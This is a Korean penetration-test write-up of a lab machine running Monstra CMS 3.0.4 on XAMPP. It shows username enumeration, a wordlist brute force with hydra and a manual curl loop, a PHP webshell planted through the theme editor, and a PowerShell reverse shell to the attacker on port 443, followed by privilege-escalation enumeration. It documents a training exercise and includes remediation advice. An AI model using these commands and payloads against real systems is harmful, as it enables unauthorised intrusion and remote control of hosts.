---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/partial
  - tech/enum/dirbust
  - tech/enum/searchsploit
  - tech/cred/crack
  - tech/payload/revshell
type: machine
platform: pg
os: windows
ip: 192.168.248.180
ports: [80, 135, 139, 443, 445, 3389]
services: [http, microsoft-ds, ms-wbt-server, msrpc, netbios-ssn, ssl/http]
status: partial
manual_tags: true
manual_cves: true
manual_status: true
tech_count: 4
---
> [!info] 요약
> 타겟 `192.168.248.180` · Windows 10(빌드 10.0.19041, 호스트 `MIKE-PC`) · Fundamental · 플래그 1/2(user 만 확보, proof 미확보)
> 진입점: tcp/80 XAMPP → `/blog` = Monstra CMS 3.0.4 → `/blog/users` 사용자명 노출 → cewl+hashcat 룰로 만든 사전으로 hydra 브루트포스 → `admin:wazowski` → 관리자 패널 테마 에디터 `add_chunk` 로 PHP 파일 생성(EDB-52038) → PowerShell 리버스셸(tcp/443) → local.txt
> 권한상승: 미완. `C:\xampp\apache\bin\httpd.exe`·`mysql\bin\mysqld.exe` 가 `Authenticated Users:(M)` 로 mike 에게 쓰기 가능하나, XAMPP 가 서비스가 아니라 mike 의 자동 로그온 데스크톱 세션에서 도는 프로세스라 재실행해도 SYSTEM 이 되지 않음. 「무엇이 이걸 SYSTEM 컨텍스트로 재실행하는가」를 찾던 중 포털 동시 1대 슬롯 규칙으로 인스턴스가 정지·리버트됨 — 배제가 아니라 중단
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.180

### Initial Access – XAMPP 위 Monstra CMS 의 사용자명 노출과 사이트 기반 사전 공격으로 얻은 관리자 크리덴셜이 테마 에디터 PHP 파일 쓰기로 이어짐

**Vulnerability Explanation:**
- Monstra CMS 3.0.4(XAMPP for Windows 위 구동) `/blog/users` 가 인증 없이 전체 사용자 목록(로그인명·이메일)을 노출 — 사용자 열거로 브루트포스 탐색공간 축소
- 로그인 잠금이 서버측 카운터가 아니라 클라이언트 쿠키(`login_attempts`)에만 존재 — 쿠키를 안 보내는 도구는 잠금 자체를 못 받음
- 관리자 패널 테마 에디터의 `add_chunk` 기능이 `.chunk.php` 파일을 웹루트에 그대로 생성 — 파일 업로드 기능이 비활성이어도 별도의 인증된 임의 파일 쓰기 경로가 존재(EDB-52038)
- 공개 익스플로잇(EDB-48479·EDB-49949·EDB-52038) 전부 admin/editor 세션을 전제 — 문제는 익스플로잇이 아니라 크리덴셜 확보로 귀결

**Vulnerability Fix:**
- Monstra 3.0.4(2016-04-05)가 마지막 릴리스 — 유지보수되는 CMS 로 교체할 것. 불가하면 관리자 패널을 IP 로 제한
- 로그인 잠금을 서버측 계정/IP 카운터 + 지수 백오프로 구현할 것
- `/blog/users` 를 인증 뒤로 이동하거나 비공개화할 것
- 비밀번호를 사이트 콘텐츠에서 파생하지 말 것 — `wazowski` 는 페이지 제목 그대로였음
- 업로드 확장자를 화이트리스트로 제한하고 업로드 디렉터리의 스크립트 핸들러를 비활성화할 것. 테마/청크 편집기 등 PHP 파일 쓰기가 가능한 관리 기능은 접근 최소화

**Severity:** High — 인증 후 원격 코드 실행(RCE). 크리덴셜이 사이트 콘텐츠 기반 자체 제작 사전으로 크랙 가능해 실질적 위험은 무인증에 근접

**Steps to reproduce the attack:**
1. `/blog/users` 로 사용자명(`admin`·`mike`) 열거
2. 소스(`admin/index.php`) 확인 — 로그인 잠금이 서버 카운터가 아니라 클라이언트 쿠키(`login_attempts`)에 있음을 확인
3. 서버 처리량 실측(약 70 req/s) → rockyou 비현실적 판단, `cewl` 로 사이트 기반 사전 생성
4. hashcat 룰(`best66.rule`)로 사전 확장 → hydra 로 무차별대입(쿠키 미공유) → `admin:wazowski` 획득
5. 관리자 패널 로그인 → filesmanager 업로드 시도(비활성 확인) → 테마 에디터 `add_chunk` 로 PHP 파일 생성(EDB-52038)
6. 생성된 `.chunk.php` 로 명령 실행 확인 → PowerShell 리버스셸(tcp/443) 획득

### Service Enumeration

작업일 2026-08-20. Kali `tun0` = **192.168.45.207**. 타겟 로컬시각 UTC-7(PDT), Kali UTC+9 — 시각 표기마다 어느 쪽인지 명시함.

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.180 | TCP: 80, 135, 139, 443, 445, 3389 |

#### Nmap

```bash
ssh kali@10.44.44.128 "tmux new-session -d -s mon_nmap 'mkdir -p ~/PG/Monster && cd ~/PG/Monster && nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.180 2>&1 | tee nmap.full.txt; exec bash'"
```

```text
# Nmap 7.98 scan initiated Thu Aug 20 20:09:05 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.180
Nmap scan report for 192.168.248.180
Host is up (0.091s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10
|_http-title: Mike Wazowski
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Mike Wazowski
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-08-20T11:12:33+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: MIKE-PC
|   NetBIOS_Domain_Name: MIKE-PC
|   NetBIOS_Computer_Name: MIKE-PC
|   DNS_Domain_Name: Mike-PC
|   DNS_Computer_Name: Mike-PC
|   Product_Version: 10.0.19041
|_  System_Time: 2026-08-20T11:12:18+00:00
| ssl-cert: Subject: commonName=Mike-PC
| Not valid before: 2026-08-19T11:05:01
|_Not valid after:  2027-02-18T11:05:01
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
```
— 출처: `~/PG/Monster/nmap.log`

읽을 줄 셋.

- `Apache 2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10` — XAMPP for Windows 7.3.10 의 출하 조합. 배너 하나로 단정하지 않고 독립 근거를 하나 더 확보함 — 아래 gobuster 결과에서 `/phpmyadmin`·`/webalizer` 가 404 가 아니라 403(XAMPP 가 이 경로를 `Require local` 로 출하)
- `rdp-ntlm-info` 가 NLA 협상에서 호스트명·빌드를 노출(`MIKE-PC`·`10.0.19041`). 워크그룹 머신, 도메인 없음
- `5040`(CDPSvc)·`7680`(Delivery Optimization)·`49664~49669`(동적 RPC) — Windows 10 기본 구성

UDP top-100 — `open` 상태 포트 0개(99개 `open|filtered` = 미확정, 1개 closed). 출처 `~/PG/Monster/nmap_udp.log`.

#### 디렉터리 열거

```bash
gobuster dir -u http://192.168.248.180/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,zip -t 40 -o gobuster80.log
```

의미 있는 것만 추림(403 다수는 Windows 예약 디바이스명 `con`·`aux` 등에 Apache 가 답한 소음):

```text
/index.html           (Status: 200) [Size: 22916]
/blog                 (Status: 301) [Size: 342] [--> http://192.168.248.180/blog/]
/assets               (Status: 301) [Size: 344] [--> http://192.168.248.180/assets/]
/Index.html           (Status: 200) [Size: 22916]
/examples             (Status: 503) [Size: 1062]
/Blog                 (Status: 301) [Size: 342] [--> http://192.168.248.180/Blog/]
/Assets               (Status: 301) [Size: 344] [--> http://192.168.248.180/Assets/]
/INDEX.html           (Status: 200) [Size: 22916]
/phpmyadmin           (Status: 403) [Size: 1207]
/webalizer            (Status: 403) [Size: 1207]
```
— 출처: `~/PG/Monster/gobuster80.log` (ANSI 색코드 제거 후)

443 은 80 과 `ETag`·`Last-Modified`·`Content-Length` 가 전부 동일 — 같은 문서루트라 따로 팔 것 없음.

루트는 Monsters, Inc. 테마의 정적 랜딩 페이지. 제목이 `Mike Wazowski` 이고 뒤의 cewl 사전이 이 화면에서 나옴.

![[PG-Monster-80-index.png]]

#### Monstra 3.0.4

`/blog/` 본문에 두 가지가 같이 나옴.

```text
<meta name="robots" content="index, follow"><meta name="generator" content="Powered by Monstra 3.0.4" />
<link rel="stylesheet" href="http://monster.pg/blog/public/assets/css/bootstrap.css" type="text/css" />
```

`generator` 메타 = 버전, 자산 링크 = vhost `monster.pg`. `siteurl` 옵션에 호스트명이 박혀 IP 로 접근해도 링크·리다이렉트가 전부 `monster.pg` 로 나감 — Kali `/etc/hosts` 에 한 줄 추가 후 진행.

```bash
ssh kali@10.44.44.128 "grep -q monster.pg /etc/hosts || echo '192.168.248.180 monster.pg' | sudo tee -a /etc/hosts"
```

![[PG-Monster-80-blog.png]]

버전 판정 독립 근거 둘 — `generator` 메타, 그리고 위 스크린샷 푸터의 `Powered by Monstra 3.0.4`. 소스도 클론해 뒀고(`git clone https://github.com/monstra-cms/monstra`) 이후 익스플로잇 판단의 1차 사료가 됨.

#### 사용자명은 그냥 준다

```text
$ curl -s 'http://monster.pg/blog/users' | sed -e 's/<[^>]*>/ /g'
 ...
 Users 
 admin 
 mike 
```

`/blog/users/1`·`/blog/users/2` 는 이메일까지 노출 — `wazowski@monster.pg`·`mike@monster.pg`(HTML 엔티티 난독화뿐이라 브라우저가 풀어줌).

사용자가 둘뿐이라 뒤의 사전 공격이 현실적 시간에 들어옴 — 계정 후보 수만큼 탐색공간이 곱해지기 때문.

### Initial Access – Monstra 사전 공격으로 얻은 관리자 계정 → 테마 에디터 RCE

#### 공개 익스플로잇은 전부 「인증 필요」다

```text
$ searchsploit monstra
 Monstra CMS 3.0.4 - (Authenticated) Arbitrary ... | php/webapps/43348.txt
 Monstra CMS 3.0.4 - Authenticated Arbitrary F ... | php/webapps/48479.txt
 Monstra CMS 3.0.4 - Remote Code Execution (Au ... | php/webapps/49949.py
 Monstra CMS 3.0.4 - Remote Code Execution (RC ... | php/webapps/52038.py
```

전부 관리자/에디터 세션을 전제함. 검토한 셋:

- **EDB-48479 / CVE-2017-18048** — filesmanager 에 `.php7` 업로드
- **EDB-49949 / CVE-2018-6383** — 같은 곳에 `.pht`·`.phar` 업로드
- **EDB-52038** — themes 의 `add_chunk` 로 PHP 파일 생성

앞의 둘이 성립하는 근거는 `plugins/box/filesmanager/filesmanager.admin.php` 의 `$forbidden_types` 블랙리스트 — `php`·`phtml`·`php3`~`php5` 까지만 세고 멈춰 `php7`·`pht`·`phar` 가 빠져 있음.

그래서 문제는 익스플로잇이 아니라 크리덴셜로 귀결됨. 여기서 방향을 바꿈.

#### 로그인 잠금은 쿠키에 있다

`admin/index.php` 소스.

```php
if (Request::post('login_submit')) {
    if (Cookie::get('login_attempts') && Cookie::get('login_attempts') >= 5) {
        $login_error = __('You are banned for 10 minutes. Try again later', 'users');
    } else {
        $user = $users->select("[login='" . trim(Request::post('login')) . "']", null);
        if (count($user) !== 0) {
            if ($user['login'] == Request::post('login')) {
                if (trim($user['password']) == Security::encryptPassword(Request::post('password'))) {
                    if ($user['role'] == 'admin' || $user['role'] == 'editor') {
```

둘이 한꺼번에 정해짐.

- **잠금이 서버 카운터가 아니라 `login_attempts` 쿠키에만 있음.** 쿠키를 안 보내는 클라이언트(hydra)는 잠금을 아예 못 받음. 반대로 쿠키 단지를 재사용하는 `curl` 은 6번째 시도부터 밴 화면을 받음
- **role 이 admin/editor 가 아니면 `$login_error` 가 설정되지 않음** = 응답에 "Wrong ..." 문자열이 없음. hydra 실패조건을 `Wrong` 으로 잡으면 role 이 낮은 계정의 정답 비밀번호까지 히트로 걸림 — 실패조건은 이 분기를 보고 고른 것

#### 왜 사전을 직접 만들었나

10k 상용 사전(`seclists/.../10k-most-common.txt`)을 두 사용자에 전부 돌려 20,000 시도 — 9분, 무소득(출처 `~/PG/Monster/hydra_10k_run.txt`).

rockyou 는 계산상 불가. 서버 처리량을 실측함.

```text
$ time (for i in $(seq 1 200); do curl -s -o /dev/null -m 30 -d 'login=admin&password=x&login_submit=Log+In' http://192.168.248.180/blog/admin/index.php & done; wait)
( for i in $(seq 1 200); do; curl -s -o /dev/null -m 30 -d   &; done; wait; )  1.51s user 0.83s system 81% cpu 2.865 total
```

— 출처: 이 `time` 출력은 파일로 보존되지 않았고 `~/.zsh_history` 에도 없음(전 작업이 비대화형 `ssh kali "..."`). 재확인 경로 없음.

200요청/2.87초 ≈ 70 req/s. rockyou 1,434만 개면 약 56시간 — 손절 지점.

대신 사이트 본문으로 사전을 만듦.

```bash
cewl -d 3 -m 4 -w cewl.txt http://192.168.248.180/
cewl -d 3 -m 4 -w cewl_blog.txt http://monster.pg/blog/
cat cewl.txt cewl_blog.txt | sort -u > words.txt          # 253 단어
hashcat --stdout -r /usr/share/hashcat/rules/best66.rule words.txt | sort -u > words_b66.txt   # 14,579
```

`-m 4` = 4글자 미만 폐기. `-d 3` = 링크 3단계 추적(한 장짜리 사이트라 주로 `/blog` 하위 페이지 수집용). `best66.rule` = 대소문자·숫자꼬리·리트 치환 등 규칙 66개(Kali hashcat 7.1.2 에는 흔히 쓰이는 `best64.rule` 이 없고 `best66.rule` 만 있음).

#### 크리덴셜

```bash
hydra -I -L users.txt -P words_b66.txt -t 64 192.168.248.180 \
  http-post-form "/blog/admin/index.php:login=^USER^&password=^PASS^&login_submit=Log+In:Wrong"
```

`-I` = 이전 세션의 `hydra.restore` 확인 프롬프트를 건너뜀(빼면 10초 대기 — 실제 10k 런에서 그 경고를 받음). 마지막 콜론 뒤 `Wrong` 은 실패 조건 — 응답에 이 문자열이 있으면 실패로 처리함.

```text
[DATA] max 64 tasks per 1 server, overall 64 tasks, 29158 login tries (l:2/p:145
79), ~456 tries per task
[DATA] attacking http-post-form://192.168.248.180:80/blog/admin/index.php:login=
^USER^&password=^PASS^&login_submit=Log+In:Wrong
[STATUS] 2256.00 tries/min, 2256 tries in 00:01h, 26902 to do in 00:12h, 64 acti
ve
[STATUS] 1927.67 tries/min, 5783 tries in 00:03h, 23375 to do in 00:13h, 64 acti
ve
[STATUS] 1835.86 tries/min, 12851 tries in 00:07h, 16307 to do in 00:09h, 64 act
ive
[80][http-post-form] host: 192.168.248.180   misc: /blog/admin/index.php:login=^
USER^&password=^PASS^&login_submit=Log+In:Wrong   login: admin   password: wazow
ski
```
— 출처: `~/PG/Monster/hydra_cewl_run.txt`(같은 내용이 `tmux capture-pane -pt mon_hydra2` 로도 회수됨, Kali 20:36 KST). 히트 한 줄만 추린 것은 `hydra_cewl.log`.

`admin` / `wazowski` — 사이트 제목 "Mike Wazowski" 에서 cewl 이 뽑은 단어 그대로임.

**수동 대안.** hydra 는 시험에서 허용되나, 실패 조건이 응답 본문에 있어 도구 없이 셸 한 줄로도 같은 일이 됨.
```bash
while read p; do
  if ! curl -s -d "login=admin&password=$p&login_submit=Log+In" \
       http://TARGET/blog/admin/index.php | grep -q Wrong; then echo "HIT: $p"; fi
done < words_b66.txt
```
쿠키 옵션(`-b`/`-c`)을 붙이면 안 됨 — 붙이는 순간 5회 만에 밴 화면을 받고 이후 전부 오탐이 됨.

#### 관리자 패널

```text
$ curl -s -i -c a.jar -d 'login=admin&password=wazowski&login_submit=Log+In' 'http://192.168.248.180/blog/admin/index.php' | head -12
HTTP/1.1 302 302 Found
Date: Thu, 20 Aug 2026 11:37:20 GMT
Server: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10
X-Powered-By: PHP/7.3.10
Set-Cookie: PHPSESSID=d1nu49vbucca99uk2j675oifn6; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: index.php
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

302 + `Location: index.php` 가 로그인 성공 표식(실패는 200 + "Wrong ...").

![[PG-Monster-80-admin-login.png]]

#### 업로드가 죽어 있다

정석대로 `.php7` 업로드부터 시도함.

```text
$ curl -s -b a.jar -c a.jar -F "csrf=$csrf" -F 'file=@shell.php7;filename=shell.php7' -F 'upload_file=Upload' \
    'http://192.168.248.180/blog/admin/index.php?id=filesmanager&path=uploads/'
$ curl -s -b a.jar 'http://192.168.248.180/blog/admin/index.php?id=filesmanager&path=uploads/' | grep -oE 'message *: *"[^"]*"'
message : "File was not uploaded"
```

확장자를 의심해 `.txt`·`.jpg` 로도 시도함.

```text
t.txt -> message : "File was not uploaded"
t.jpg -> message : "File was not uploaded"
```

확장자 문제가 아니라 업로드 기능 자체가 죽어 있음. `filesmanager.admin.php` 에서 이 문구가 나오는 갈래는 `$_FILES['file']` 이 비었거나 `move_uploaded_file()` 이 실패한 경우 — 어느 쪽인지는 `php.ini` 를 못 읽어 미확인. `file_uploads=Off` 가 가장 그럴듯하나 **[가정]**.

이 계층 분리(확장자 필터인가, 업로드 기능인가)가 방향 전환의 근거임 — 확장자 문제였다면 `.pht`·`.phar`·이중확장자로 계속 갔을 것.

#### themes → add_chunk (EDB-52038)

업로드가 아니라 에디터로 전환. Monstra 관리자 패널의 테마 편집기는 `.chunk.php` 파일을 새로 생성할 수 있고, 그 파일이 `public/themes/<theme>/` 밑에 그대로 떨어져 웹에서 직접 실행됨.

```bash
curl -s -b a.jar -c a.jar \
  --data-urlencode 'csrf=ad97499bc94b7df8726fdd354384c172f1062dfe' \
  --data-urlencode 'name=mon9x' \
  --data-urlencode 'content@chunk_payload.php' \
  --data-urlencode 'add_file=Save' \
  'http://192.168.248.180/blog/admin/index.php?id=themes&action=add_chunk'
```

`chunk_payload.php` 내용:

```php
<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; system($_REQUEST["cmd"]); echo "</pre>"; } ?>
```

`--data-urlencode 'content@파일'` 로 페이로드를 파일에서 읽힘 — 본문에 `<`·`>`·`$`·`"` 가 전부 들어 있어 인용부호로 싸우는 대신 URL 인코딩을 curl 에 맡기는 쪽이 확실함.

CSRF 토큰은 같은 세션에서 `?id=themes&action=add_chunk` 를 GET 해 `name="csrf" value="..."` 에서 추출. Monstra 토큰은 세션 단위라 한 번 뽑으면 계속 사용 가능.

```text
$ curl -s 'http://192.168.248.180/blog/public/themes/default/mon9x.chunk.php?cmd=whoami'
<pre>mike-pc\mike
</pre>
```

RCE 확보. 실행 계정 `mike-pc\mike` — Apache 가 SYSTEM 서비스가 아니라 mike 로 구동 중임이 여기서 드러남.

#### 대화형 셸

> [!danger] 웹셸로 읽은 플래그는 OSCP 에서 0점이다
> 규정 원문 *"this includes any type of web-based shell"*. 위 `?cmd=` 는 리버스셸을 던지는 데만 쓰고, 플래그는 반드시 대화형 셸에서 읽을 것.

리스너 선기동. 비대화형 SSH 는 호출이 끝나면 자식 프로세스를 죽이므로 tmux 안이어야 함.

```bash
ssh kali@10.44.44.128 "tmux new-session -d -s mon_lsnr443 'rlwrap nc -lvnp 443; exec bash'"
```

PowerShell 리버스셸을 UTF-16LE base64 로 만들어 `-e` 로 전달.

```bash
iconv -f UTF-8 -t UTF-16LE ps_rev.ps1 | base64 -w0 > ps_rev.b64
B64=$(cat ps_rev.b64)
curl -s -G --data-urlencode "cmd=powershell -nop -w hidden -e $B64" \
  'http://192.168.248.180/blog/public/themes/default/mon9x.chunk.php' -m 25
```

플래그 셋 — `-G` 는 `--data-urlencode` 를 POST 본문이 아니라 쿼리스트링으로 붙임(base64 의 `+`·`/`·`=` 를 인코딩 없이 URL 에 붙이면 `+` 가 공백으로 뒤집힘). `-w hidden` = 창 미표시, `-nop` = 프로필 로딩 생략(프로필 출력이 셸 파서를 오염시킴).

```powershell
listening on [any] 443 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.180] 50544
whoami; hostname
mike-pc\mike
Mike-PC
PS C:\xampp\htdocs\blog\public\themes\default>
```

첫 시도에 tcp/443 으로 연결됨 — 이 페이로드는 아웃바운드에도 Defender 에도 걸리지 않음.

**Local.txt value:**
`db85d2fa7033db43da92bb07dde4da5b`

시험 증거 형식대로 한 화면에 담음.

```powershell
PS C:\xampp\htdocs\blog\public\themes\default> cmd /c "whoami & hostname & ipcon
fig | findstr IPv4 & date /t & time /t & type C:\Users\mike\Desktop\local.txt"
mike-pc\mike
Mike-PC
   IPv4 Address. . . . . . . . . . . : 192.168.248.180
Thu 08/20/2026
04:40 AM
db85d2fa7033db43da92bb07dde4da5b
PS C:\xampp\htdocs\blog\public\themes\default>
```
— 출처: `~/PG/Monster/proof_user.txt`(66행). 실행 시점에 기록된 파일이 아니라 사후에 `tmux capture-pane -pt mon_lsnr443 -S -3000` 으로 페인 스크롤백에서 회수한 덤프임 — 내용은 페인 원문 그대로이나 **mtime(20:50 KST)은 명령 실행 시각이 아님.**

`cmd /c "... & ... & ..."` 로 감싼 이유 — PowerShell 에서 `&` 는 호출 연산자라 명령 구분자로 못 씀(`;` 를 쓰거나 cmd 에 넘김). 타겟 시각 `04:40 AM` 은 UTC-7, 같은 순간의 Kali 시각은 20:40 KST.

### Privilege Escalation – 미완 (SYSTEM 재실행 트리거 미확인)

**Vulnerability Explanation:** `C:\xampp\apache\bin\httpd.exe`·`C:\xampp\mysql\bin\mysqld.exe` 가 `NT AUTHORITY\Authenticated Users:(M)` 로 mike 에게 쓰기 허용됨.
- `C:\xampp` 를 `C:\` 루트에 통째로 설치한 구성의 상속 ACL — Fundamental 난이도에서 흔치 않게 눈에 띄는 오설정
- 그러나 XAMPP 가 서비스로 등록돼 있지 않고 mike 의 자동 로그온 데스크톱 세션에서 XAMPP Control Panel 이 띄운 프로세스로 돎(`Win32_Service` 에 XAMPP 항목 없음, Apache PID 소유자 `Mike`, 토큰에 `INTERACTIVE`+`CONSOLE LOGON`)
- 즉 바이너리를 교체해도 재실행 시 SYSTEM 이 아니라 mike 로 다시 뜸. 상승 완성에는 이 바이너리를 SYSTEM/Administrator 컨텍스트로 재실행하는 별도 트리거가 필요하나 **미확인** — `Privilege Escalation` 절 `PE-4` 가 그 진입점
- `SeImpersonatePrivilege` 없음(Potato 계열 배제), AutoLogon 은 켜져 있으나 평문 비밀번호가 레지스트리에 없음(LSA Secret 암호화). SAM 하이브·크리덴셜 재사용·서비스·스케줄 작업 등 후보 16종은 전부 배제됨(`PE-2` 표)

**Vulnerability Fix:**
- 웹서버를 대화형 로그온 세션에서 구동하지 말 것 — 로그온 시 XAMPP Control Panel 을 띄우는 구성은 웹 RCE 를 사용자 세션 장악으로 직결시킴. 전용 서비스 계정으로 서비스 등록할 것
- `C:\` 루트에 애플리케이션을 통째로 설치하지 말 것 — `C:\Program Files` 밑에 설치하거나 설치 후 ACL 을 명시적으로 잠글 것
- 자동 로그온 미사용 — `AutoAdminLogon=1` 은 비밀번호를 레지스트리 평문 또는 LSA Secret 에 남기고, 세션이 상시 살아 있어 사용자 컨텍스트 공격면이 항상 노출됨

**Severity:** 미평가(미완) — 실증되지 않은 리드. 트리거가 확인되면 즉시 SYSTEM 획득으로 이어질 잠재력이 있어 Critical 급 재평가가 가능하나, 이 세션에서 확인된 것은 실행 주체가 계속 mike 였다는 사실까지임.

**Steps to reproduce the attack:**
1. `whoami /all` 로 특권·그룹 확인 — `SeImpersonatePrivilege` 없음, `NT AUTHORITY\INTERACTIVE`+`CONSOLE LOGON` 있음(서비스 토큰 아님을 시사)
2. `HKLM\...\Winlogon` AutoLogon 레지스트리 확인 — `AutoAdminLogon=1`·`DefaultUserName=Mike` 이나 `DefaultPassword` 없음(LSA Secret, SYSTEM 필요해 순환)
3. `AlwaysInstallElevated`·서비스 목록·스케줄 작업·자격증명 파일·PowerShell 히스토리·`cmdkey`·SAM ACL·크리덴셜 재사용 등 16종 순차 배제
4. `icacls C:\xampp\apache\bin\httpd.exe`·`mysql\bin\mysqld.exe` 확인 — `Authenticated Users:(M)`
5. `Get-WmiObject Win32_Process ... GetOwner()` 로 실행 중인 Apache PID 소유자 확인 — `Mike`(서비스 아님, 지금은 mike 세션)
6. SYSTEM 재실행 트리거 후보(Session 0 `notepad.exe` 23개·Administrator 주기 로그온·`RunOnce`/`Userinit`/`Shell`·XAMPP Control Panel UAC 매니페스트) 확인 착수 — 완료 전 인스턴스 정지·리버트로 중단

#### 열거 결과 (whoami /all)

절 구성 — 배제한 후보 16종은 `PE-2` 표, 설명이 필요한 셋(MySQL·SeriousSAM·크리덴셜 재사용)은 `PE-2-b`·`PE-2-c`, 연결 못 지은 관측 둘은 `PE-3`, **배제가 아니라 끝까지 못 간 리드**는 `PE-4`.

⚠️ **「아니었다」와 「못 갔다」를 섞지 말 것.** `PE-2` 를 되풀이하는 것은 낭비이나, `PE-4` 를 배제로 읽고 건너뛰면 정답을 지나침.

```powershell
PS C:\xampp\htdocs\blog\public\themes\default> whoami /all

USER INFORMATION
----------------

User Name    SID
============ ==============================================
mike-pc\mike S-1-5-21-2619112490-2635448554-1147358759-1002


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes

====================================== ================ ============ ===========
=======================================
Everyone                               Well-known group S-1-1-0      Mandatory g
roup, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory g
roup, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory g
roup, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory g
roup, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory g
roup, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory g
roup, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory g
roup, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory g
roup, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory g
roup, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory g
roup, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192



PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

PS C:\xampp\htdocs\blog\public\themes\default>
```
— 출처: `~/PG/Monster/proof_user.txt` (플래그 절에 이 파일의 내력을 적었다)

이 한 화면에서 읽히는 것 셋.

- **`SeImpersonatePrivilege` 없음** → Potato 계열(JuicyPotato·PrintSpoofer·GodPotato) 전부 후보에서 탈락. 서비스 계정에서 나온 셸이면 대개 붙어 있는 권한이라, 부재 자체가 다음 항목과 맞물림
- **`NT AUTHORITY\INTERACTIVE`·`CONSOLE LOGON` 존재** → 서비스 토큰에는 안 붙는 그룹. Apache 가 서비스가 아니라 mike 의 로그온 세션에서 도는 대화형 프로세스라는 뜻. 여기서 「자동 로그온이 켜져 있고 레지스트리에 평문 비밀번호가 있을 것」이라는 추론으로 `PE-1` 로 진행함(결과는 빈손)
- **`BUILTIN\Remote Desktop Users` 소속** → mike 의 평문 비밀번호를 얻으면 3389 로 전환 가능

#### PE-1. AutoLogon 은 켜져 있는데 비밀번호가 없다

INTERACTIVE 관측 때문에 여기부터 진입. 자동 로그온이 켜져 있으면 `DefaultPassword` 에 평문이 들어 있는 구성이 흔함.

```powershell
PS C:\xampp\htdocs\blog\public\themes\default> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "AutoAdminLogon DefaultUserName DefaultPassword DefaultDomainName Aut
oLogonSID AltDefaultPassword"
    AutoLogonSID    REG_SZ    S-1-5-21-2619112490-2635448554-1147358759-1002
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    Mike
    DefaultDomainName    REG_SZ    DESKTOP-8OB2COP
PS C:\xampp\htdocs\blog\public\themes\default>
```

관측 셋.

- **`AutoAdminLogon=1` 인데 `DefaultPassword`·`AltDefaultPassword` 부재.** GUI(`netplwiz`)나 Sysinternals `Autologon` 으로 설정하면 평문이 레지스트리가 아니라 LSA Secret 에 `DefaultPassword` 이름으로 암호화돼 들어감. 읽으려면 SYSTEM 이 필요해 순환 — 이 경로는 여기서 종료
- **`AutoLogonSID` 가 `...-1002`** = `whoami /all` 의 mike SID 와 동일. 자동 로그온 대상이 Administrator 가 아니라 mike 본인이라, 비밀번호를 캐냈어도 이미 가진 권한임
- **`DefaultDomainName` = `DESKTOP-8OB2COP`, 호스트명 = `MIKE-PC`.** **[가정]** 자동 로그온 설정 후 컴퓨터 이름을 변경했다는 해석이 자연스러우나, 확인된 것은 두 문자열이 다르다는 사실뿐 — `PE-3` 에 미해결 단서로 남김

#### PE-2. 나머지 후보 — 전부 때려봤고 전부 빈손

출처 열 주의 — 열거는 리버스셸 페인에서 돌았고 스크롤백은 21:00 KST 에 한 번 저장된 뒤 끊김(`try_privesc_full_scrollback.log`). 이후 명령의 출력은 페인에만 남았고 페인은 박스 정지와 함께 소멸. **「페인만」 4줄은 파일로 재확인이 안 되는 것으로 읽을 것.**

